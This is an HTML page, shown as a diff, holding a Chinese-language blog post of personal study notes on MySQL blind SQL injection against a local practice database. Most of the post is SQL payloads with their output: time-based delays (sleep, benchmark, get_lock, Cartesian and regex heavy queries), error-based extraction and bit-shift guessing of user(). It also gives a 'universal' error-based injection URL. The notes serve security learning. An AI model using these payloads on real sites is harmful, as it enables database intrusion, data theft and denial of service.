@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Blind_injection - Monitor&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Never be afraid to try and fail. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>monitor</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#两个基本特性"><span class="toc-text">两个基本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AND-0"><span class="toc-text">AND 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OR-1"><span class="toc-text">OR 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#elt"><span class="toc-text">elt()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-and-benchmark"><span class="toc-text">sleep() and benchmark()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heavy-Query-笛卡儿积"><span class="toc-text">Heavy Query 笛卡儿积</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-lock-枷锁机制"><span class="toc-text">Get_lock() 枷锁机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heavy-Query正则表达式"><span class="toc-text">Heavy Query正则表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错盲注"><span class="toc-text">报错盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor-count-group-by"><span class="toc-text">floor()+count()+group by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-amp"><span class="toc-text">使用&amp;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用"><span class="toc-text">使用|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-1"><span class="toc-text">使用^</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-2"><span class="toc-text">使用~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-gt-gt-和-lt-lt"><span class="toc-text">使用 &gt;&gt; 和&lt;&lt;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#END"><span class="toc-text">END</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> Never be afraid to try and fail. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Blind_injection
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-07-13 20:09:30</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#-[sql]" title="-[sql]">-[sql]</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=502043537&auto=1&height=66"></iframe>
+
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="两个基本特性"><a href="#两个基本特性" class="headerlink" title="两个基本特性"></a>两个基本特性</h2><h3 id="AND-0"><a href="#AND-0" class="headerlink" title="AND 0"></a>AND 0</h3><p> 在注入中，我们经常用到and连接两个并列语句，得出的结果是他们的交集：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and 1 and sleep(1);</span><br><span class="line">Empty set (1.00 sec)</span><br><span class="line">mysql&gt; select * from users where id = 1 and 0 and sleep(1); </span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>这里第一条语句执行了<strong>sleep(1)</strong>，但是却没有结果显示，个人理解，这是因为 <strong>id=1 and 1</strong> 是有交集的，但是再跟and sleep(1) 得到的是空集 ，所以没有结果出现，但是因为是条件为真，执行了sleep。</p>
+<p>第二条语句什么都没执行，因为<strong>id=1 and 0</strong> 集合为 0，注意这里说的不是空，而是为0，并且和 <strong>and sleep(1)</strong>交集也为0，所以这里个人认为是获得的最条件为假，所以什么都没有执行。</p>
+<h3 id="OR-1"><a href="#OR-1" class="headerlink" title="OR 1"></a>OR 1</h3><p>or 是求并集</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1 or 1 or sleep(1);</span><br><span class="line">+----+----------+------------+ </span><br><span class="line">| id | username | password   | </span><br><span class="line">+----+----------+------------+ </span><br><span class="line">|  1 | Dumb     | Dumb       | </span><br><span class="line">|  2 | Angelina | I-kill-you | </span><br><span class="line">|  3 | Dummy    | p@ssword   | </span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  | </span><br><span class="line">|  6 | superman | genious    | </span><br><span class="line">|  7 | batman   | mob!le     | </span><br><span class="line">|  8 | admin    | admin      | </span><br><span class="line">|  9 | admin1   | admin1     | </span><br><span class="line">| 10 | admin2   | admin2     | </span><br><span class="line">| 11 | admin3   | admin3     | </span><br><span class="line">| 12 | dhakkan  | dumbo      | </span><br><span class="line">| 14 | admin4   | admin4     | </span><br><span class="line">+----+----------+------------+ </span><br><span class="line">13 rows in set (0.00 sec) </span><br><span class="line">mysql&gt; select * from users where id=1 or 0 or sleep(1); </span><br><span class="line">+----+----------+----------+ </span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">1 row in set (12.01 sec)</span><br></pre></td></tr></table></figure>
+<p>第一条语句，我理解的是类似于<strong>if()</strong>的语法，ture则不执行后面的<strong>sleep</strong>，false则执行。这里 <strong>id =1 or 1</strong> 为真，求并集，所以数据库所有的内容打印出来，不执行<strong>sleep</strong>语句。</p>
+<p>第二条语句，因为 <strong>id=1 or 0</strong> 为假，所以执行了<strong>sleep</strong>语句，并且交集为<strong>id=1</strong>，打印了第一条语句。但是回显时间是12秒，因为是 or 表示并集，所以sleep会将数据表里面的数据都遍历一遍，在打印出要的结果。</p>
+<p><strong>下面很多语句，用到的都是上面两个核心思想</strong></p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段。</p>
+<h3 id="elt"><a href="#elt" class="headerlink" title="elt()"></a>elt()</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elt(N,str1,str2,str3<span class="built_in">..</span>.)</span><br><span class="line">说明:若<span class="attribute">N</span>=1,则返回str1，N=2则返回str2，以此类推。如果N大于参数数目或小于1则返回NULL.</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1 <span class="keyword">and</span> elt((1&gt;1)+1,1,sleep(1));</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">| id | username | password | </span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     | </span><br><span class="line">+----+----------+----------+ </span><br><span class="line">1 row <span class="keyword">in</span> <span class="builtin-name">set</span> (0.00 sec) </span><br><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1 <span class="keyword">and</span> elt((<span class="attribute">1</span>=1)+1,1,sleep(1));</span><br><span class="line">Empty <span class="builtin-name">set</span> (1.00 sec)</span><br></pre></td></tr></table></figure>
+<p>这里N的部分就可以放我们放想要获取的内容。</p>
+<h3 id="sleep-and-benchmark"><a href="#sleep-and-benchmark" class="headerlink" title="sleep() and benchmark()"></a>sleep() and benchmark()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见的用法我就不说了，这里看到一种以前没见的用法，记录一下。</span><br><span class="line">mysql&gt; select * from users where id =1-sleep(1); </span><br><span class="line">+----+----------+----------+ </span><br><span class="line">| id | username | password | </span><br><span class="line">+----+----------+----------+ </span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">1 row in set (13.11 sec)</span><br></pre></td></tr></table></figure>
+<p>在这里用<strong>“-”</strong> 连接sleep()可以达到刺探数据库表中的行数，虽然只是sleep(1),但实际上，它将数据库中每一条数据都遍历一遍，所以结果会是13秒。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">benchmark(times,Execution statement)</span><br><span class="line">这个函数是将前面后面语句执行多少次来实现延迟，听说比较烧cpu。</span><br><span class="line">sql=select * from users where id = 1-benchmark(1000000,rand())</span><br></pre></td></tr></table></figure>
+<p>结合时间注入达到刺探字段数目</p>
+<p><code>select * from users where id =1-if(substr(version(),1,1)=&#39;10&#39;,sleep(10),0)</code></p>
+<h3 id="Heavy-Query-笛卡儿积"><a href="#Heavy-Query-笛卡儿积" class="headerlink" title="Heavy Query 笛卡儿积"></a>Heavy Query 笛卡儿积</h3><p>这个姿势我也没怎么看懂，原理是将简单的表查询不断叠加，直到获得到我们想要的延迟。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A,information_schema.columns B,informati</span><br><span class="line">on_schema.columns C; </span><br><span class="line">+------------+ </span><br><span class="line">| count(*)   | </span><br><span class="line">+------------+ </span><br><span class="line">| 9129329000 | </span><br><span class="line">+------------+ </span><br><span class="line">1 row in set (2 min 36.17 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="Get-lock-枷锁机制"><a href="#Get-lock-枷锁机制" class="headerlink" title="Get_lock() 枷锁机制"></a>Get_lock() 枷锁机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Get_lock(str,timeout)</span><br><span class="line">to obtain a lock with a name given by the string str, using a timeout of</span><br><span class="line">timeout seconds. A negative timeout value means infinite timeout. The lock is</span><br><span class="line">exclusive. While held by one session, other sessions cannot obtain a lock of</span><br><span class="line">the same name.</span><br><span class="line">基本语句：select Get_lock(str,timeout)</span><br><span class="line">		select release_lock(str)</span><br><span class="line">首先现在一个终端上锁住username字段：</span><br><span class="line">mysql&gt; select get_lock(&apos;username&apos;,10);</span><br><span class="line">+-------------------------+ </span><br><span class="line">| get_lock(&apos;username&apos;,10) | </span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+ </span><br><span class="line">1 row in set (0.00 sec) </span><br><span class="line">在一个新的终端在尝试锁住username：</span><br><span class="line">mysql&gt; select get_lock(&apos;username&apos;,10);</span><br><span class="line">+-------------------------+ </span><br><span class="line">| get_lock(&apos;username&apos;,10) | </span><br><span class="line">+-------------------------+ </span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure>
+<p>可以看到，第二个终端失败并且延时了10秒钟，因此我们可以用这个方法去进行时间盲注。</p>
+<p>1.通过注入对某个字段加锁：</p>
+<p>  <code>select * from users where id=1 and select get_lock(&#39;username&#39;,10);</code></p>
+<p>2.构造条件经行时间注入：</p>
+<p>  <code>select * from users where id =1 and 1 and select get_lock(&#39;username&#39;,10);</code></p>
+<p>  <code>select * from users where id =1 and 0 and select get_lock(&#39;username&#39;,10);</code></p>
+<p>其中再 <strong>and 1</strong> 和 <strong>and 0</strong> 分别是我们获得的正确和错误的数据。</p>
+<p><strong>这个方法有个限制性条件就是数据库必须永久性连接，否则终端断开就会自动解锁了，php中用mysql_pconnect()来进行永久性连接。</strong></p>
+<h3 id="Heavy-Query正则表达式"><a href="#Heavy-Query正则表达式" class="headerlink" title="Heavy Query正则表达式"></a>Heavy Query正则表达式</h3><p>mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配</p>
+<ol>
+<li>like 常用通配符：<strong>%</strong> 、<strong>_</strong> 、<strong>escape</strong></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">% : 匹配0个或任意多个字符</span><br><span class="line"></span><br><span class="line">_ : 匹配任意一个字符</span><br><span class="line"></span><br><span class="line">escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE &apos;/%/_%_&apos; ESCAPE&apos;/&apos;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>rlike和regexp:常用通配符：<strong>.</strong> 、<strong>*</strong> 、 <strong>[]</strong> 、 <strong>^</strong> 、 <strong>$</strong> 、<strong>{n}</strong></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">. : 匹配任意单个字符</span><br><span class="line"></span><br><span class="line">* ： 匹配0个或多个前一个得到的字符</span><br><span class="line"></span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line"></span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line"></span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line"></span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br></pre></td></tr></table></figure>
+<p>来自一叶飘零师傅的payload参考：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id =1 and IF(1,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;</span><br></pre></td></tr></table></figure>
+<h2 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h2><h3 id="floor-count-group-by"><a href="#floor-count-group-by" class="headerlink" title="floor()+count()+group by"></a>floor()+count()+group by</h3><p>万能payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/less-5/?id=1&apos; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<p>mysql位操作符</p>
+<h3 id="使用-amp"><a href="#使用-amp" class="headerlink" title="使用&amp;"></a>使用&amp;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&apos;username&apos;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&apos;username&apos;,10) | </span><br><span class="line">+-------------------------+ </span><br><span class="line">|                       0 | </span><br><span class="line">+-------------------------+ </span><br><span class="line">1 row in set (10.00 sec)</span><br><span class="line">                                            </span><br><span class="line">mysql&gt; select * from users where id = 1 &amp; 1;</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">                                            </span><br><span class="line">mysql&gt; select * from users where id = 1 &amp; 0;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用|"></a>使用|</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 0 | 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     | </span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">                                              </span><br><span class="line">mysql&gt; select * from users where id = 0 | 0; </span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用^"></a>使用^</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1^0; </span><br><span class="line">+----+----------+----------+ </span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+ </span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.14 sec)</span><br><span class="line">                                           </span><br><span class="line">mysql&gt; select * from users where id = 1^1; </span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用~"></a>使用~</h3><p>这个方法是这样的，当系统不允许输入大的数字的时候，可能是限制了字符的长度，限制了不能使用科学计数法，但是我们还是想让其报错，我们就能采取这种方式，exp()等溢出报错；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1 and if(1,1,exp(~(select * from (select version())a)));</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.03 sec)                                                                   mysql&gt; select * from users where id =1 and if(0,1,exp(~(select * from (select version())a)));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;5.5.40&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-gt-gt-和-lt-lt"><a href="#使用-gt-gt-和-lt-lt" class="headerlink" title="使用 &gt;&gt; 和&lt;&lt;"></a>使用 &gt;&gt; 和&lt;&lt;</h3><p>这个用到的是二分法和二进制的计算，比如我们想要获取user()的第一个字符：</p>
+<p>1.首先我们向右移7位，(注意: 这里是从0开始算的)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 7)=0; </span><br><span class="line">+--------------------------------------+ </span><br><span class="line">| (ascii((substr(user(),1,1))) &gt;&gt; 7)=0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 | </span><br><span class="line">+--------------------------------------+ </span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>所以确定第一位：0???????</p>
+<p>2.那么第二位肯定就是0或1了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 6)=0;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| (ascii((substr(user(),1,1))) &gt;&gt; 6)=0 |</span><br><span class="line">+--------------------------------------+ </span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>错误，所以就是01??????</p>
+<p>3.那么第三位就是010=2或者110=3了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 5)=2; </span><br><span class="line">+--------------------------------------+ </span><br><span class="line">| (ascii((substr(user(),1,1))) &gt;&gt; 5)=2 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+ </span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>确定第三位是011?????</p>
+<p>………</p>
+<p>以此类推，最后一位：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 0)=114; </span><br><span class="line">+----------------------------------------+ </span><br><span class="line">| (ascii((substr(user(),1,1))) &gt;&gt; 0)=114 |</span><br><span class="line">+----------------------------------------+ </span><br><span class="line">|                                      1 |</span><br><span class="line">+----------------------------------------+ </span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>最终的第一个字符的二进制是：01110010</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select b&apos;01110010&apos;;</span><br><span class="line">+-------------+ </span><br><span class="line">| b&apos;01110010&apos; |</span><br><span class="line">+-------------+</span><br><span class="line">| r           |</span><br><span class="line">+-------------+ </span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>得到第一个字符串 ‘r’;</p>
+<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>参考链接：</p>
+<ol>
+<li><a href="https://www.anquanke.com/post/id/170626#h2-17" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626#h2-17</a></li>
+<li><a href="https://www.freebuf.com/articles/web/175049.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/175049.html</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/35245598" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35245598</a></li>
+</ol>
+<p>今天一天都只是再命令行端进行的检验，明天找点实例练练手，在巩固。</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
